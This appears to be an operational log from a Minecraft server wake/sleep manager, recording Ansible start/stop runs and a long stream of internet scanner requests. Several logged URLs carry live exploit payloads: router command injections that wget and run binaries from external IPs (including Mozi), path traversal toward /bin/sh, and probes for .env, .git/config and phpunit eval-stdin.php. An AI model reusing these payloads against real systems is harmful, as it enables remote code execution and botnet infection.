+2024-09-09 23:56:23 info: [WebServer] Server is responding with 1 players 
+2024-09-09 23:56:23 info: status and waking 
+2024-09-09 23:56:23 info: 1 
+2024-09-09 23:56:23 info: false 
+2024-09-09 23:57:23 info: [WebServer] Getting server status 
+2024-09-09 23:57:23 info: [WebServer] Server is responding with 1 players 
+2024-09-09 23:57:23 info: status and waking 
+2024-09-09 23:57:23 info: 1 
+2024-09-09 23:57:23 info: false 
+2024-09-09 23:58:23 info: [WebServer] Getting server status 
+2024-09-09 23:58:23 info: [WebServer] Server is responding with 1 players 
+2024-09-09 23:58:23 info: status and waking 
+2024-09-09 23:58:23 info: 1 
+2024-09-09 23:58:23 info: false 
+2024-09-09 23:59:23 info: [WebServer] Getting server status 
+2024-09-09 23:59:24 info: [WebServer] Server is responding with 1 players 
+2024-09-09 23:59:24 info: status and waking 
+2024-09-09 23:59:24 info: 1 
+2024-09-09 23:59:24 info: false 
+2024-09-10 00:00:24 info: [WebServer] Getting server status 
+2024-09-10 00:00:24 info: [WebServer] Server is responding with 1 players 
+2024-09-10 00:00:24 info: status and waking 
+2024-09-10 00:00:24 info: 1 
+2024-09-10 00:00:24 info: false 
+2024-09-10 00:01:24 info: [WebServer] Getting server status 
+2024-09-10 00:01:24 info: [WebServer] Server is responding with 1 players 
+2024-09-10 00:01:24 info: status and waking 
+2024-09-10 00:01:24 info: 1 
+2024-09-10 00:01:24 info: false 
+2024-09-10 00:01:54 info: to ==> https://146.56.112.234:80/cgi-bin/luci/;stok=/locale 
+2024-09-10 00:02:24 info: [WebServer] Getting server status 
+2024-09-10 00:02:24 error: connect ECONNREFUSED 43.203.153.128:25565 
+2024-09-10 00:02:24 error: [WebServer] Error getting server status: Error: connect ECONNREFUSED 43.203.153.128:25565 
+2024-09-10 00:02:24 info: [WebServer] Server is not responding. 
+2024-09-10 00:03:41 info: to ==> https://146.56.112.234/ 
+2024-09-10 00:03:45 info: to ==> https://146.56.112.234/phpmyadmin/scripts/setup.php 
+2024-09-10 00:03:52 info: [WebServer](::ffff:61.43.124.130) Wake up server was Sleeping 
+2024-09-10 00:03:52 info: [WebServer] Starting Minecraft Server 
+2024-09-10 00:04:26 warn: [WebServer] Error/Warn starting server: [WARNING]: provided hosts list is empty, only localhost is available. Note that
+the implicit localhost does not match 'all'
+[WARNING]: provided hosts list is empty, only localhost is available. Note that
+the implicit localhost does not match 'all'
+ 
+2024-09-10 00:04:26 info: [WebServer] Started server: /opt/web/CloudMCServerManager
+
+PLAY [Persist local Ansible to S3] *********************************************
+
+TASK [Create temporary directory] **********************************************
+changed: [localhost]
+
+TASK [Create an archive from the local Ansible + utilities] ********************
+changed: [localhost]
+
+TASK [Push ansible archive to S3] **********************************************
+changed: [localhost]
+
+TASK [Remove temporary directory] **********************************************
+changed: [localhost]
+
+PLAY RECAP *********************************************************************
+localhost                  : ok=4    changed=4    unreachable=0    failed=0    skipped=0    rescued=0    ignored=0   
+
+
+PLAY [Resizing ASG] ************************************************************
+
+TASK [Set auto-scaling group size to 1] ****************************************
+changed: [localhost]
+
+PLAY RECAP *********************************************************************
+localhost                  : ok=1    changed=1    unreachable=0    failed=0    skipped=0    rescued=0    ignored=0   
+
+
+------------------ 
+2024-09-10 00:04:26 info: [WebServer] Getting server status 
+2024-09-10 00:04:26 error: [WebServer] Error getting hostname 
+2024-09-10 00:05:56 info: seniorious28, 3.35.200.33, craft.seni.kr 
+2024-09-10 00:05:58 info: [object Object] 
+2024-09-10 00:06:26 error: ETIMEDOUT 
+2024-09-10 00:06:26 error: [WebServer] Error getting server status: Error: ETIMEDOUT 
+2024-09-10 00:06:26 info: status and waking 
+2024-09-10 00:06:26 info: -1 
+2024-09-10 00:06:26 info: true 
+2024-09-10 00:07:26 info: [WebServer] Getting server status 
+2024-09-10 00:07:26 error: [WebServer] Error getting hostname 
+2024-09-10 00:07:26 error: connect ECONNREFUSED 3.35.200.33:25565 
+2024-09-10 00:07:26 error: [WebServer] Error getting server status: Error: connect ECONNREFUSED 3.35.200.33:25565 
+2024-09-10 00:07:26 info: status and waking 
+2024-09-10 00:07:26 info: -1 
+2024-09-10 00:07:26 info: true 
+2024-09-10 00:08:26 info: [WebServer] Getting server status 
+2024-09-10 00:08:26 error: [WebServer] Error getting hostname 
+2024-09-10 00:08:26 info: [WebServer] Server is responding with 0 players 
+2024-09-10 00:08:26 info: status and waking 
+2024-09-10 00:08:26 info: -1 
+2024-09-10 00:08:26 info: true 
+2024-09-10 00:08:26 info: [Discord] Sending waking up message 
+2024-09-10 00:08:26 info: waking is now false 
+2024-09-10 00:08:26 info: [WebServer] No one is on the server, starting the 10 minute timer. 
+2024-09-10 00:08:27 info: [Discord] response:  
+2024-09-10 00:09:24 info: [WebServer](::ffff:61.43.124.130) Stopping server was Running 
+2024-09-10 00:09:24 info: [WebServer] Killing Minecraft Server, restart: false 
+2024-09-10 00:09:26 info: [WebServer] Getting server status 
+2024-09-10 00:09:26 error: [WebServer] Error getting hostname 
+2024-09-10 00:09:26 info: [WebServer] Server is responding with 0 players 
+2024-09-10 00:09:26 info: status and waking 
+2024-09-10 00:09:26 info: 0 
+2024-09-10 00:09:26 info: false 
+2024-09-10 00:10:26 info: [WebServer] Getting server status 
+2024-09-10 00:10:27 error: [WebServer] Error getting hostname 
+2024-09-10 00:10:27 error: connect ECONNREFUSED 3.35.200.33:25565 
+2024-09-10 00:10:27 error: [WebServer] Error getting server status: Error: connect ECONNREFUSED 3.35.200.33:25565 
+2024-09-10 00:10:27 info: [WebServer] Server is not responding. 
+2024-09-10 00:10:27 info: [Discord] Sending closing server message 
+2024-09-10 00:10:27 info: [Discord] response:  
+2024-09-10 00:12:04 error: [WebServer] Error stopping server: [WARNING]: Platform linux on host 3.35.200.33 is using the discovered Python
+interpreter at /usr/bin/python3.10, but future installation of another Python
+interpreter could change the meaning of that path. See
+https://docs.ansible.com/ansible-
+core/2.17/reference_appendices/interpreter_discovery.html for more information.
+ 
+2024-09-10 00:12:04 info: [WebServer] Stopped server: /opt/web/CloudMCServerManager
+
+PLAY [Shutdown] ****************************************************************
+
+TASK [Gathering Facts] *********************************************************
+ok: [3.35.200.33]
+
+TASK [Shutdown server and push backup to S3] ***********************************
+changed: [3.35.200.33]
+
+PLAY [Set ASG size to 0] *******************************************************
+
+TASK [Gathering Facts] *********************************************************
+ok: [localhost]
+
+TASK [ec2_asg] *****************************************************************
+changed: [localhost]
+
+PLAY RECAP *********************************************************************
+3.35.200.33                : ok=2    changed=1    unreachable=0    failed=0    skipped=0    rescued=0    ignored=0   
+localhost                  : ok=2    changed=1    unreachable=0    failed=0    skipped=0    rescued=0    ignored=0   
+
+
+------------------ 
+2024-09-10 00:17:09 info: to ==> https://146.56.112.234:80/cgi-bin/luci/;stok=/locale 
+2024-09-10 00:24:30 info: to ==> https://146.56.112.234:80/ 
+2024-09-10 00:39:55 info: to ==> https://146.56.112.234:80/cgi-bin/luci/;stok=/locale 
+2024-09-10 00:44:22 info: to ==> https://localhost/ 
+2024-09-10 01:10:51 info: to ==> https://speed.cloudflare.com/cdn-cgi/trace 
+2024-09-10 01:14:27 info: to ==> https://146.56.112.234/ 
+2024-09-10 01:35:41 info: to ==> https://146.56.112.234/ 
+2024-09-10 01:40:12 info: to ==> https://146.56.112.234:80/ 
+2024-09-10 01:41:48 info: to ==> https://146.56.112.234/.env 
+2024-09-10 01:49:18 info: to ==> https://146.56.112.234:80/ 
+2024-09-10 01:49:26 info: to ==> https://wake.seni.kr/ 
+2024-09-10 02:07:46 info: to ==> https://146.56.112.234:80/ 
+2024-09-10 02:12:15 info: to ==> https://146.56.112.234/ 
+2024-09-10 02:38:52 info: to ==> https://146.56.112.234/ 
+2024-09-10 02:43:58 info: to ==> https://146.56.112.234:80/cgi-bin/luci/;stok=/locale 
+2024-09-10 02:52:45 info: to ==> https://146.56.112.234:80/ 
+2024-09-10 03:13:13 info: to ==> https://146.56.112.234:80/ 
+2024-09-10 03:23:39 info: to ==> https://146.56.112.234:80/ 
+2024-09-10 03:24:23 info: to ==> https://146.56.112.234/.env 
+2024-09-10 03:42:31 info: to ==> https://146.56.112.234:80/cgi-bin/luci/;stok=/locale 
+2024-09-10 03:47:24 info: to ==> https://146.56.112.234:80/ 
+2024-09-10 03:53:26 info: to ==> https://146.56.112.234/ 
+2024-09-10 03:59:31 info: to ==> https://wake.seni.kr/ 
+2024-09-10 04:17:31 info: to ==> https://localhost/ 
+2024-09-10 04:27:58 info: to ==> https://146.56.112.234/.git/config 
+2024-09-10 04:35:14 info: to ==> https://146.56.112.234:80/ 
+2024-09-10 05:20:40 info: to ==> https://146.56.112.234:80/ 
+2024-09-10 05:26:55 info: to ==> https://146.56.112.234:80/cgi-bin/luci/;stok=/locale 
+2024-09-10 05:30:21 info: to ==> https://146.56.112.234:80/ 
+2024-09-10 05:35:26 info: to ==> https://undefined/ 
+2024-09-10 05:35:57 info: to ==> https://146.56.112.234:80/ 
+2024-09-10 05:50:30 info: to ==> https://146.56.112.234:80/cgi-bin/luci/;stok=/locale 
+2024-09-10 05:53:35 info: to ==> https://146.56.112.234:80/cgi-bin/luci/;stok=/locale 
+2024-09-10 05:55:08 info: to ==> https://146.56.112.234/.env 
+2024-09-10 06:05:58 info: to ==> https://146.56.112.234:80/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 
+2024-09-10 06:11:14 info: to ==> https://146.56.112.234:80/solr/admin/info/system?wt=json 
+2024-09-10 06:22:31 info: to ==> https://146.56.112.234:80/cgi-bin/luci/;stok=/locale 
+2024-09-10 06:51:27 info: to ==> https://146.56.112.234:80/?XDEBUG_SESSION_START=phpstorm 
+2024-09-10 07:05:53 info: to ==> https://146.56.112.234:80/console/ 
+2024-09-10 07:08:46 info: to ==> https://146.56.112.234/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+tplink%3B+wget+http%3A%2F%2F45.202.35.88%2Ftplink%3B+chmod+777+tplink%3B+.%2Ftplink+tplink%3B+rm+-rf+tplink%60) 
+2024-09-10 07:13:04 info: to ==> https://146.56.112.234:80/_ignition/execute-solution 
+2024-09-10 07:20:14 info: to ==> https://146.56.112.234:80/ 
+2024-09-10 07:20:37 info: to ==> https://146.56.112.234/owncloud/status.php 
+2024-09-10 07:20:38 info: to ==> https://146.56.112.234/status.php 
+2024-09-10 07:21:21 info: to ==> https://146.56.112.234:80/ 
+URIError: Failed to decode param '/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh'
+    at decodeURIComponent (<anonymous>)
+    at decode_param (/opt/web/mcsleepingserverstarter/node_modules/express/lib/router/layer.js:172:12)
+    at Layer.match (/opt/web/mcsleepingserverstarter/node_modules/express/lib/router/layer.js:123:27)
+    at matchLayer (/opt/web/mcsleepingserverstarter/node_modules/express/lib/router/index.js:585:18)
+    at next (/opt/web/mcsleepingserverstarter/node_modules/express/lib/router/index.js:226:15)
+    at jsonParser (/opt/web/mcsleepingserverstarter/node_modules/body-parser/lib/types/json.js:122:7)
+    at Layer.handle [as handle_request] (/opt/web/mcsleepingserverstarter/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/opt/web/mcsleepingserverstarter/node_modules/express/lib/router/index.js:328:13)
+    at /opt/web/mcsleepingserverstarter/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/opt/web/mcsleepingserverstarter/node_modules/express/lib/router/index.js:346:12)
+2024-09-10 07:26:35 info: to ==> https://146.56.112.234:80/ 
+2024-09-10 07:27:56 info: to ==> https://146.56.112.234/.env 
+2024-09-10 07:38:57 info: to ==> https://146.56.112.234/hudson 
+2024-09-10 07:46:04 info: to ==> https://146.56.112.234:80/cgi-bin/luci/;stok=/locale 
+2024-09-10 07:57:13 info: to ==> https://146.56.112.234:80/actuator/gateway/routes 
+2024-09-10 08:19:03 info: to ==> https://146.56.112.234:80/geoserver 
+2024-09-10 08:26:55 info: to ==> https://localhost/ 
+2024-09-10 08:28:43 info: to ==> https://146.56.112.234:80/cgi-bin/luci/;stok=/locale 
+2024-09-10 08:32:59 info: to ==> https://146.56.112.234/ 
+2024-09-10 08:51:25 info: to ==> https://146.56.112.234:80/ 
+2024-09-10 09:05:37 info: to ==> https://146.56.112.234/.env 
+2024-09-10 09:10:43 info: to ==> https://speed.cloudflare.com/cdn-cgi/trace 
+2024-09-10 09:19:47 info: to ==> https://146.56.112.234/ 
+2024-09-10 09:41:13 info: to ==> https://wake.seni.kr/ 
+2024-09-10 09:55:24 info: to ==> https://undefined/ 
+2024-09-10 09:59:39 info: to ==> https://146.56.112.234:80/ 
+2024-09-10 10:27:10 info: to ==> https://undefined/ 
+2024-09-10 10:58:10 info: to ==> https://146.56.112.234:80/cgi-bin/luci/;stok=/locale 
+2024-09-10 11:07:18 info: to ==> https://146.56.112.234:80/cgi-bin/luci/;stok=/locale 
+2024-09-10 11:27:22 info: to ==> https://localhost/ 
+2024-09-10 11:38:37 info: to ==> https://146.56.112.234:80/cgi-bin/luci/;stok=/locale 
+2024-09-10 12:09:59 info: to ==> https://146.56.112.234:80/cgi-bin/luci/;stok=/locale 
+URIError: Failed to decode param '/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh'
+    at decodeURIComponent (<anonymous>)
+    at decode_param (/opt/web/mcsleepingserverstarter/node_modules/express/lib/router/layer.js:172:12)
+    at Layer.match (/opt/web/mcsleepingserverstarter/node_modules/express/lib/router/layer.js:123:27)
+    at matchLayer (/opt/web/mcsleepingserverstarter/node_modules/express/lib/router/index.js:585:18)
+    at next (/opt/web/mcsleepingserverstarter/node_modules/express/lib/router/index.js:226:15)
+    at jsonParser (/opt/web/mcsleepingserverstarter/node_modules/body-parser/lib/types/json.js:122:7)
+    at Layer.handle [as handle_request] (/opt/web/mcsleepingserverstarter/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/opt/web/mcsleepingserverstarter/node_modules/express/lib/router/index.js:328:13)
+    at /opt/web/mcsleepingserverstarter/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/opt/web/mcsleepingserverstarter/node_modules/express/lib/router/index.js:346:12)
+2024-09-10 12:42:03 info: to ==> https://146.56.112.234:80/cgi-bin/luci/;stok=/locale 
+2024-09-10 12:50:47 info: to ==> https://146.56.112.234:80/ 
+2024-09-10 12:53:06 info: to ==> https://146.56.112.234/ 
+2024-09-10 12:53:07 info: to ==> https://undefined/ 
+2024-09-10 13:04:35 info: to ==> https://146.56.112.234/ 
+2024-09-10 13:24:02 info: to ==> https://146.56.112.234/ 
+2024-09-10 13:27:24 info: to ==> https://146.56.112.234/ 
+2024-09-10 13:27:55 info: to ==> https://146.56.112.234/favicon.ico 
+2024-09-10 13:28:26 info: to ==> https://146.56.112.234/geoserver/web/ 
+2024-09-10 13:30:41 info: to ==> https://undefined/ 
+2024-09-10 13:30:41 info: to ==> https://146.56.112.234/odinhttpcall1725942641 
+2024-09-10 13:30:41 info: to ==> https://undefined/ 
+2024-09-10 13:30:42 info: to ==> https://146.56.112.234/HNAP1 
+2024-09-10 13:30:42 info: to ==> https://146.56.112.234/evox/about 
+2024-09-10 13:30:43 info: to ==> https://undefined/ 
+2024-09-10 13:30:43 info: to ==> https://146.56.112.234/ 
+2024-09-10 13:30:44 info: to ==> https://146.56.112.234:80/cgi-bin/authLogin.cgi 
+2024-09-10 13:30:44 info: to ==> https://146.56.112.234:80/query?q=SHOW+DIAGNOSTICS 
+2024-09-10 13:30:44 info: to ==> https://146.56.112.234:80/solr/admin/info/system 
+2024-09-10 13:30:44 info: to ==> https://146.56.112.234/ 
+2024-09-10 13:30:44 info: to ==> https://146.56.112.234:80/v2/_catalog 
+2024-09-10 13:30:45 info: to ==> https://146.56.112.234:80/query?q=SHOW+DIAGNOSTICS 
+2024-09-10 13:30:45 info: to ==> https://146.56.112.234:80/cgi-bin/authLogin.cgi 
+2024-09-10 13:30:45 info: to ==> https://146.56.112.234:80/solr/admin/info/system 
+2024-09-10 13:30:45 info: to ==> https://146.56.112.234:80/v2/_catalog 
+2024-09-10 13:30:46 info: to ==> https://146.56.112.234:80/query?q=SHOW+DIAGNOSTICS 
+2024-09-10 13:30:46 info: to ==> https://146.56.112.234:80/cgi-bin/authLogin.cgi 
+2024-09-10 13:30:46 info: to ==> https://146.56.112.234:80/solr/admin/info/system 
+2024-09-10 13:30:46 info: to ==> https://146.56.112.234:80/v2/_catalog 
+2024-09-10 13:30:46 info: to ==> https://146.56.112.234:80/favicon.ico 
+2024-09-10 13:30:46 info: to ==> https://146.56.112.234:80/favicon.ico 
+2024-09-10 13:30:47 info: to ==> https://146.56.112.234:80/solr/admin/cores?action=STATUS&wt=json 
+2024-09-10 13:30:47 info: to ==> https://146.56.112.234:80/favicon.ico 
+2024-09-10 13:30:48 info: to ==> https://146.56.112.234:80/solr/admin/cores?action=STATUS&wt=json 
+2024-09-10 13:30:49 info: to ==> https://146.56.112.234:80/solr/admin/cores?action=STATUS&wt=json 
+2024-09-10 13:41:11 info: to ==> https://146.56.112.234/ 
+2024-09-10 13:48:55 info: to ==> https://146.56.112.234:80/cgi-bin/luci/;stok=/locale 
+URIError: Failed to decode param '/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh'
+    at decodeURIComponent (<anonymous>)
+    at decode_param (/opt/web/mcsleepingserverstarter/node_modules/express/lib/router/layer.js:172:12)
+    at Layer.match (/opt/web/mcsleepingserverstarter/node_modules/express/lib/router/layer.js:123:27)
+    at matchLayer (/opt/web/mcsleepingserverstarter/node_modules/express/lib/router/index.js:585:18)
+    at next (/opt/web/mcsleepingserverstarter/node_modules/express/lib/router/index.js:226:15)
+    at jsonParser (/opt/web/mcsleepingserverstarter/node_modules/body-parser/lib/types/json.js:122:7)
+    at Layer.handle [as handle_request] (/opt/web/mcsleepingserverstarter/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/opt/web/mcsleepingserverstarter/node_modules/express/lib/router/index.js:328:13)
+    at /opt/web/mcsleepingserverstarter/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/opt/web/mcsleepingserverstarter/node_modules/express/lib/router/index.js:346:12)
+2024-09-10 14:12:47 info: to ==> https://undefined/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 
+2024-09-10 14:46:55 info: to ==> https://146.56.112.234:80/ 
+2024-09-10 14:49:12 info: to ==> https://127.0.0.1/ 
+2024-09-10 14:55:43 info: to ==> https://146.56.112.234/.git/config 
+2024-09-10 15:03:04 info: to ==> https://146.56.112.234/ 
+2024-09-10 15:16:54 info: to ==> https://146.56.112.234:80/cgi-bin/luci/;stok=/locale 
+2024-09-10 15:17:20 info: to ==> https://146.56.112.234:80/ 
+2024-09-10 15:19:02 info: to ==> https://146.56.112.234:80/ 
+2024-09-10 15:19:11 info: to ==> https://146.56.112.234/ 
+2024-09-10 15:20:09 info: to ==> https://146.56.112.234/ 
+2024-09-10 15:21:19 info: to ==> https://undefined/ 
+2024-09-10 15:53:57 info: to ==> https://localhost/ 
+2024-09-10 15:54:58 info: to ==> https://146.56.112.234/ 
+2024-09-10 15:55:16 info: to ==> https://146.56.112.234:80/ 
+2024-09-10 15:55:26 info: to ==> https://146.56.112.234/ 
+2024-09-10 15:59:42 info: to ==> https://146.56.112.234/actuator/health 
+2024-09-10 16:05:59 info: to ==> https://146.56.112.234:80/ 
+2024-09-10 16:12:46 info: to ==> https://146.56.112.234:80/cgi-bin/luci/;stok=/locale 
+2024-09-10 16:16:48 info: to ==> https://146.56.112.234:80/ 
+2024-09-10 17:05:55 info: to ==> https://wake.seni.kr/robots.txt 
+2024-09-10 17:10:52 info: to ==> https://speed.cloudflare.com/cdn-cgi/trace 
+2024-09-10 17:12:08 info: to ==> https://146.56.112.234:80/ 
+2024-09-10 17:49:28 info: to ==> https://146.56.112.234:80/cgi-bin/luci/;stok=/locale 
+2024-09-10 17:57:15 info: to ==> https://wake.seni.kr/robots.txt 
+2024-09-10 17:59:13 info: to ==> https://146.56.112.234:80/ 
+2024-09-10 18:00:50 info: to ==> https://146.56.112.234/ 
+2024-09-10 18:10:40 info: to ==> https://146.56.112.234:80/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.87.69%2Ft+-O-+|+sh%60) 
+2024-09-10 18:31:30 info: to ==> https://speed.cloudflare.com/cdn-cgi/trace 
+2024-09-10 18:51:48 info: to ==> https://146.56.112.234:80/cgi-bin/luci/;stok=/locale 
+2024-09-10 19:13:46 info: to ==> https://146.56.112.234:80/ 
+2024-09-10 19:15:33 info: to ==> https://146.56.112.234:80/cgi-bin/luci/;stok=/locale 
+2024-09-10 19:44:34 info: to ==> https://146.56.112.234/ 
+2024-09-10 19:48:33 info: to ==> https://146.56.112.234:80/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.87.69%2Ft+-O-+|+sh%60) 
+2024-09-10 20:24:13 info: to ==> https://localhost/ 
+2024-09-10 20:27:46 info: to ==> https://146.56.112.234:80/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.87.69%2Ft+-O-+|+sh%60) 
+2024-09-10 20:35:28 info: to ==> https://146.56.112.234:80/ 
+2024-09-10 21:09:25 info: to ==> https://146.56.112.234/ 
+2024-09-10 21:10:07 info: to ==> https://127.0.0.1/ 
+2024-09-10 21:18:34 info: to ==> https://undefined/ 
+2024-09-10 21:21:23 info: to ==> https://undefined/ 
+2024-09-10 21:27:01 info: to ==> https://146.56.112.234:80/ 
+2024-09-10 21:27:10 info: to ==> https://146.56.112.234/ 
+2024-09-10 21:58:40 info: to ==> https://146.56.112.234/ 
+2024-09-10 21:59:31 info: to ==> https://146.56.112.234/ 
+2024-09-10 22:10:26 info: to ==> https://146.56.112.234:80/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.87.69%2Ft+-O-+|+sh%60) 
+2024-09-10 22:13:07 info: to ==> https://146.56.112.234:80/cgi-bin/luci/;stok=/locale 
+2024-09-10 22:31:23 info: to ==> https://146.56.112.234/.env 
+2024-09-10 22:34:21 info: to ==> https://146.56.112.234:80/ 
+2024-09-10 22:37:32 info: to ==> https://localhost/ 
+2024-09-10 22:47:55 info: to ==> https://146.56.112.234:80/cgi-bin/luci/;stok=/locale 
+2024-09-10 23:13:46 info: to ==> https://146.56.112.234:80/cgi-bin/luci/;stok=/locale 
+2024-09-10 23:41:30 info: to ==> https://146.56.112.234:80/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.87.69%2Ft+-O-+|+sh%60) 
+2024-09-10 23:45:56 info: to ==> https://146.56.112.234/.env 
+2024-09-11 00:08:58 info: to ==> https://146.56.112.234:80/ 
+2024-09-11 01:06:02 info: to ==> https://146.56.112.234:80/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.87.69%2Ft+-O-+|+sh%60) 
+2024-09-11 01:10:17 info: to ==> https://146.56.112.234:80/ 
+2024-09-11 01:22:47 info: to ==> https://146.56.112.234/.env 
+2024-09-11 01:23:01 info: to ==> https://146.56.112.234:80/ 
+2024-09-11 01:23:10 info: to ==> https://146.56.112.234/ 
+2024-09-11 01:31:45 info: to ==> https://146.56.112.234:80/cgi-bin/luci/;stok=/locale 
+2024-09-11 01:39:17 info: to ==> https://146.56.112.234:80/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.87.69%2Ft+-O-+|+sh%60) 
+2024-09-11 01:52:55 info: to ==> https://146.56.112.234/ 
+2024-09-11 02:12:13 info: to ==> https://146.56.112.234:80/ 
+2024-09-11 02:12:33 info: to ==> https://undefined/ 
+2024-09-11 02:20:56 info: to ==> https://undefined/ 
+2024-09-11 02:28:11 info: to ==> https://146.56.112.234/.env 
+2024-09-11 02:38:41 info: to ==> https://146.56.112.234/ 
+2024-09-11 03:09:14 info: to ==> https://146.56.112.234/ 
+2024-09-11 03:15:56 info: to ==> https://146.56.112.234:80/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.87.69%2Ft+-O-+|+sh%60) 
+2024-09-11 03:50:08 info: to ==> https://ngw.dvr163.com/address/client?id=5331428214&ch_count=4&extconv=3&r=90121312 
+2024-09-11 03:54:26 info: to ==> https://undefined/ 
+2024-09-11 04:25:10 info: to ==> https://146.56.112.234:80/ 
+2024-09-11 04:25:43 info: to ==> https://146.56.112.234:80/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.87.69%2Ft+-O-+|+sh%60) 
+2024-09-11 04:29:06 info: to ==> https://146.56.112.234/ 
+2024-09-11 04:51:48 info: to ==> https://undefined/ 
+2024-09-11 05:11:16 info: to ==> https://146.56.112.234/boaform/admin/formLogin 
+2024-09-11 05:29:16 info: to ==> https://146.56.112.234/ 
+2024-09-11 05:41:03 info: to ==> https://146.56.112.234:80/cgi-bin/luci/;stok=/locale 
+2024-09-11 06:09:32 info: to ==> https://146.56.112.234:80/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.87.69%2Ft+-O-+|+sh%60) 
+2024-09-11 06:10:31 info: to ==> https://146.56.112.234:80/ 
+2024-09-11 06:11:20 info: to ==> https://146.56.112.234:80/ 
+2024-09-11 06:14:55 info: to ==> https://146.56.112.234:80/ 
+2024-09-11 06:36:20 info: to ==> https://146.56.112.234:80/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 
+2024-09-11 06:42:25 info: to ==> https://146.56.112.234:80/solr/admin/info/system?wt=json 
+2024-09-11 07:04:54 info: to ==> https://146.56.112.234:80/ 
+2024-09-11 07:11:41 info: to ==> https://146.56.112.234:80/?XDEBUG_SESSION_START=phpstorm 
+2024-09-11 07:25:26 info: to ==> https://146.56.112.234:80/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.87.69%2Ft+-O-+|+sh%60) 
+2024-09-11 07:40:02 info: to ==> https://146.56.112.234:80/cgi-bin/luci/;stok=/locale 
+2024-09-11 07:52:01 info: to ==> https://146.56.112.234:80/console/ 
+2024-09-11 07:57:58 info: to ==> https://146.56.112.234:80/_ignition/execute-solution 
+2024-09-11 08:03:24 info: to ==> https://146.56.112.234:80/ 
+2024-09-11 08:09:24 info: to ==> https://146.56.112.234:80/ 
+2024-09-11 08:30:15 info: to ==> https://146.56.112.234:80/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.87.69%2Ft+-O-+|+sh%60) 
+URIError: Failed to decode param '/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh'
+    at decodeURIComponent (<anonymous>)
+    at decode_param (/opt/web/mcsleepingserverstarter/node_modules/express/lib/router/layer.js:172:12)
+    at Layer.match (/opt/web/mcsleepingserverstarter/node_modules/express/lib/router/layer.js:123:27)
+    at matchLayer (/opt/web/mcsleepingserverstarter/node_modules/express/lib/router/index.js:585:18)
+    at next (/opt/web/mcsleepingserverstarter/node_modules/express/lib/router/index.js:226:15)
+    at jsonParser (/opt/web/mcsleepingserverstarter/node_modules/body-parser/lib/types/json.js:122:7)
+    at Layer.handle [as handle_request] (/opt/web/mcsleepingserverstarter/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/opt/web/mcsleepingserverstarter/node_modules/express/lib/router/index.js:328:13)
+    at /opt/web/mcsleepingserverstarter/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/opt/web/mcsleepingserverstarter/node_modules/express/lib/router/index.js:346:12)
+2024-09-11 08:36:31 info: to ==> https://146.56.112.234:80/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 
+2024-09-11 08:36:34 info: to ==> https://146.56.112.234:80/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php 
+2024-09-11 08:36:37 info: to ==> https://146.56.112.234:80/vendor/phpunit/src/Util/PHP/eval-stdin.php 
+2024-09-11 08:36:39 info: to ==> https://146.56.112.234:80/vendor/phpunit/Util/PHP/eval-stdin.php 
+2024-09-11 08:36:41 info: to ==> https://146.56.112.234:80/vendor/phpunit/phpunit/LICENSE/eval-stdin.php 
+2024-09-11 08:36:44 info: to ==> https://146.56.112.234:80/vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 
+2024-09-11 08:36:46 info: to ==> https://146.56.112.234:80/phpunit/phpunit/src/Util/PHP/eval-stdin.php 
+2024-09-11 08:36:49 info: to ==> https://146.56.112.234:80/phpunit/phpunit/Util/PHP/eval-stdin.php 
+2024-09-11 08:36:52 info: to ==> https://146.56.112.234:80/phpunit/src/Util/PHP/eval-stdin.php 
+2024-09-11 08:36:54 info: to ==> https://146.56.112.234:80/phpunit/Util/PHP/eval-stdin.php 
+2024-09-11 08:36:57 info: to ==> https://146.56.112.234:80/lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php 
